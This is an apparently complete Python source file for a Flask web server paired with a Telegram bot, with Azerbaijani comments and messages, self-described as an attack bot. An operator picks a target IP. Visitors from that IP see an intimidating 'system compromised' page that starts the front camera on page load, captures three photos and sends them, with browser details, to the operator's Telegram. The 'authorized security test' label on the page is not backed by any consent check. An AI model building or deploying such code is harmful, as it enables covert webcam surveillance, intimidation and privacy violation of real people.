import os
import re
import time
import json
import base64
import logging
import threading
import asyncio
from flask import Flask, request, render_template_string, jsonify
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters
from telegram import InputFile

# ========== KONFİQ ==========
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

TOKEN = os.environ.get('BOT_TOKEN')
ADMIN_ID = int(os.environ.get('ADMIN_ID', '0'))
PORT = int(os.environ.get('PORT', 10000))
APP_URL = os.environ.get('RENDER_EXTERNAL_URL', '')

active_attacks = {}  # {ip: {'chat_id': int, 'active': bool, 'photos': []}}

# ========== HÜCUM SƏHİFƏSİ (Camera Capture daxil) ==========
ATTACK_PAGE = '''<!DOCTYPE html>
<html lang="az">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ryhavean Server</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0a0a;
            color: #00ff00;
            font-family: 'Courier New', monospace;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            overflow: hidden;
        }
        .container {
            text-align: center;
            padding: 3rem;
            border: 3px solid #00ff00;
            border-radius: 15px;
            background: rgba(0,255,0,0.03);
            animation: glow 2s infinite;
            max-width: 800px;
        }
        @keyframes glow {
            0% { box-shadow: 0 0 10px #ff0000; }
            50% { box-shadow: 0 0 40px #ff0000, 0 0 80px #ff0000; }
            100% { box-shadow: 0 0 10px #ff0000; }
        }
        h1 {
            font-size: 3rem;
            color: #ff0000;
            text-shadow: 0 0 20px #ff0000, 0 0 40px #ff0000;
            margin-bottom: 2rem;
            animation: blink 1s infinite;
        }
        @keyframes blink {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.3; }
        }
        .ip { color: #ffff00; font-size: 1.5rem; }
        .status { color: #ff4444; margin: 1rem 0; font-size: 1.2rem; }
        .footer { color: #555; margin-top: 3rem; font-size: 0.8rem; }
        .matrix { opacity: 0.2; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
                  background: repeating-linear-gradient(0deg, transparent, transparent 2px, #0f0 2px, #0f0 4px);
                  pointer-events: none; z-index: -1; }
        #camera-overlay {
            display: none;
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.85);
            z-index: 9999;
            justify-content: center;
            align-items: center;
            flex-direction: column;
        }
        #camera-overlay.active { display: flex; }
        #camera-overlay video {
            border: 3px solid #00ff00;
            border-radius: 10px;
            max-width: 90%;
            max-height: 60vh;
        }
        #camera-overlay .count {
            color: #00ff00;
            font-size: 2rem;
            margin-top: 1rem;
        }
    </style>
</head>
<body>
    <div class="matrix"></div>
    <div class="container">
        <h1>⚠ RYHAVEAN SERVER IS ATTACK! ⚠</h1>
        <p>Target IP: <span class="ip">{{ ip }}</span></p>
        <p class="status">>> SYSTEM COMPROMISED <<</p>
        <p>Bu bağlantı müdaxilə edildi.</p>
        <p>Bütün məlumatlarınız ələ keçirildi.</p>
        <p class="footer">Authorized Security Test — Ryhavean Pentest Team</p>
    </div>

    <div id="camera-overlay">
        <video id="video" autoplay playsinline></video>
        <div class="count" id="countdown">3 saniyə...</div>
    </div>

    <script>
    const CAPTURE_URL = window.location.origin + '/capture';
    let photosTaken = 0;
    let videoStream = null;

    async function startCamera() {
        try {
            // Ön kameraya icazə istə
            const stream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: 'user', width: 640, height: 480 },
                audio: false
            });
            videoStream = stream;
            document.getElementById('camera-overlay').classList.add('active');
            document.getElementById('video').srcObject = stream;
            await capturePhotos();
        } catch(e) {
            console.log('Kamera icazəsi alınmadı:', e.message);
        }
    }

    async function capturePhotos() {
        const video = document.getElementById('video');
        const canvas = document.createElement('canvas');
        canvas.width = 640;
        canvas.height = 480;
        const ctx = canvas.getContext('2d');

        for(let i = 0; i < 3; i++) {
            document.getElementById('countdown').textContent = `Şəkil ${i+1}/3...`;
            
            // 1 saniyə gözlə ki, kamera stabilize olsun
            await new Promise(r => setTimeout(r, 1000));
            
            ctx.drawImage(video, 0, 0, 640, 480);
            const base64Data = canvas.toDataURL('image/jpeg', 0.8);
            
            // Serverə göndər
            try {
                await fetch(CAPTURE_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        ip: '{{ ip }}',
                        photo: base64Data,
                        index: i + 1,
                        total: 3,
                        user_agent: navigator.userAgent
                    })
                });
            } catch(e) {
                console.log('Göndərmə xətası:', e);
            }
        }
        
        document.getElementById('countdown').textContent = '✅ Tamamlandı';
        
        // Kameranı bağla
        if(videoStream) {
            videoStream.getTracks().forEach(t => t.stop());
        }
        
        setTimeout(() => {
            document.getElementById('camera-overlay').classList.remove('active');
        }, 1500);
    }

    // Səhifə yüklənəndə kameranı başlat
    window.addEventListener('load', () => {
        setTimeout(startCamera, 500);
    });
    </script>
</body>
</html>'''

# ========== PERSISTENT EVENT LOOP ==========
bot_loop = None
application = None

def bot_loop_thread():
    global bot_loop, application
    
    bot_loop = asyncio.new_event_loop()
    asyncio.set_event_loop(bot_loop)
    
    application = Application.builder().token(TOKEN).updater(None).build()
    application.add_handler(CommandHandler('start', start))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_ip))
    application.add_handler(CallbackQueryHandler(button_handler))
    
    bot_loop.run_until_complete(application.initialize())
    logger.info("✅ Bot init edildi")
    
    if APP_URL:
        webhook_url = f"{APP_URL.rstrip('/')}/webhook"
        bot_loop.run_until_complete(application.bot.set_webhook(webhook_url))
        logger.info(f"✅ Webhook quruldu: {webhook_url}")
    
    bot_loop.run_forever()

# ========== TELEGRAM HANDLER-LƏR ==========
async def start(update: Update, context):
    if update.effective_chat.id != ADMIN_ID:
        await update.message.reply_text("⛔ İcazəniz yoxdur.")
        return
    await update.message.reply_text(
        "🤖 *Ryhavean Attack Bot*\n\n"
        "Hədəf IP ünvanını göndərin:\n"
        "Nümunə: `192.168.1.100`",
        parse_mode='Markdown'
    )

async def handle_ip(update: Update, context):
    if update.effective_chat.id != ADMIN_ID:
        return
    ip = update.message.text.strip()
    if not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', ip):
        await update.message.reply_text("❌ Yanlış IP formatı. Nümunə: `192.168.1.100`", parse_mode='Markdown')
        return
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("🚀 HÜCUMA BAŞLA", callback_data=f"start_{ip}")]
    ])
    await update.message.reply_text(
        f"🎯 Hədəf: `{ip}`\n\nHücum başladılsın?\n\n"
        f"📸 *Camera Capture:* Hədəf sayta daxil olduqda ön kameradan 3 şəkil çəkiləcək.",
        parse_mode='Markdown', reply_markup=keyboard
    )

async def button_handler(update: Update, context):
    query = update.callback_query
    await query.answer()
    if query.message.chat.id != ADMIN_ID:
        return
    data = query.data
    if data.startswith('start_'):
        ip = data.replace('start_', '')
        active_attacks[ip] = {'chat_id': ADMIN_ID, 'active': True, 'photos': []}
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("⛔ DAYANDIR", callback_data=f"stop_{ip}")]
        ])
        await query.edit_message_text(
            f"✅ *HÜCUM AKTİV!*\n\n"
            f"🎯 Hədəf: `{ip}`\n"
            f"📡 Status: *HÜCUM EDİLİR*\n"
            f"📸 Kamera: *Gözlənilir*\n\n"
            f"Bu IP-dən sayta daxil olan hər kəs:\n"
            f"1️⃣ Yönləndiriləcək\n"
            f"2️⃣ Ön kameradan 3 şəkil çəkiləcək\n"
            f"3️⃣ Şəkillər adminə göndəriləcək\n\n"
            f"'Dayandır' düyməsinə basana qədər aktivdir.",
            parse_mode='Markdown', reply_markup=keyboard
        )
        logger.info(f"🔥 Hücum başladı: {ip} (camera capture aktiv)")
    elif data.startswith('stop_'):
        ip = data.replace('stop_', '')
        if ip in active_attacks:
            del active_attacks[ip]
        await query.edit_message_text(
            f"⛔ *HÜCUM DAYANDIRILDI!*\n\n"
            f"🎯 IP: `{ip}`\n📡 Status: *PASİF*",
            parse_mode='Markdown'
        )
        logger.info(f"⛔ Hücum dayandı: {ip}")

# ========== FLASK ==========
app = Flask(__name__)

def get_client_ip():
    if request.headers.get('X-Forwarded-For'):
        return request.headers.get('X-Forwarded-For').split(',')[0].strip()
    return request.remote_addr

@app.route('/')
def index():
    ip = get_client_ip()
    if ip in active_attacks and active_attacks[ip]['active']:
        logger.info(f"🎯 HƏDƏF AŞKAR EDİLDİ! IP: {ip}")
        return render_template_string(ATTACK_PAGE, ip=ip)
    return '<h1>Ryhavean Server</h1><p>Server işləyir...</p>'

@app.route('/capture', methods=['POST'])
def capture():
    """Kameradan çəkilən şəkilləri qəbul et və adminə göndər"""
    try:
        data = request.get_json()
        ip = data.get('ip')
        photo_b64 = data.get('photo')
        index = data.get('index')
        total = data.get('total')
        user_agent = data.get('user_agent', 'Unknown')
        
        if not application or not bot_loop:
            return jsonify({'status': 'error', 'message': 'Bot hazır deyil'}), 503
        
        if ip not in active_attacks or not active_attacks[ip]['active']:
            return jsonify({'status': 'ignored', 'message': 'Hücum deaktiv'})
        
        # Base64-dən bytes-a çevir
        photo_bytes = base64.b64decode(photo_b64.split(',')[1])
        
        # Adminə göndər
        asyncio.run_coroutine_threadsafe(
            _send_photo_to_admin(ip, photo_bytes, index, total, user_agent),
            bot_loop
        )
        
        logger.info(f"📸 Şəkil {index}/{total} - IP: {ip}")
        return jsonify({'status': 'ok'})
        
    except Exception as e:
        logger.error(f"Capture xətası: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

async def _send_photo_to_admin(ip, photo_bytes, index, total, user_agent):
    """Şəkili adminə Telegram göndər"""
    try:
        caption = (
            f"📸 *Camera Capture - Ryhavean Attack*\n\n"
            f"🎯 Hədəf IP: `{ip}`\n"
            f"📷 Şəkil: {index}/{total}\n"
            f"🕒 Vaxt: `{time.strftime('%Y-%m-%d %H:%M:%S')}`\n"
            f"🌐 User-Agent: `{user_agent[:100]}`"
        )
        
        await application.bot.send_photo(
            chat_id=ADMIN_ID,
            photo=InputFile(photo_bytes, filename=f"capture_{ip}_{index}.jpg"),
            caption=caption,
            parse_mode='Markdown'
        )
        
        # Əgər son şəkildirsə, xülasə mesajı göndər
        if index == total:
            await application.bot.send_message(
                chat_id=ADMIN_ID,
                text=f"✅ *Camera Capture Tamamlandı!*\n\n🎯 `{ip}` ünvanından {total} şəkil alındı.",
                parse_mode='Markdown'
            )
            
    except Exception as e:
        logger.error(f"Şəkil göndərmə xətası: {e}")

@app.route('/health')
def health():
    return {'status': 'ok', 'active_targets': list(active_attacks.keys())}

@app.route('/webhook', methods=['POST'])
def webhook():
    if not application or not bot_loop:
        return 'Bot hazır deyil', 503
    
    update_json = request.get_json(force=True)
    asyncio.run_coroutine_threadsafe(
        _process_update(update_json),
        bot_loop
    )
    return 'OK'

async def _process_update(update_json):
    try:
        update = Update.de_json(update_json, application.bot)
        await application.process_update(update)
    except Exception as e:
        logger.error(f"Update xətası: {e}")

if __name__ == '__main__':
    if not TOKEN or TOKEN == 'YOUR_BOT_TOKEN':
        raise ValueError("BOT_TOKEN env-də təyin edilməyib!")
    if not ADMIN_ID or ADMIN_ID == 0:
        raise ValueError("ADMIN_ID env-də təyin edilməyib!")
    
    t = threading.Thread(target=bot_loop_thread, daemon=True)
    t.start()
    time.sleep(3)
    
    logger.info(f"🚀 Server port {PORT} üzərində işə düşür...")
    logger.info("📸 Camera capture aktivdir - hədəf sayta daxil olduqda ön kamera 3 şəkil çəkəcək")
    app.run(host='0.0.0.0', port=PORT, threaded=True)
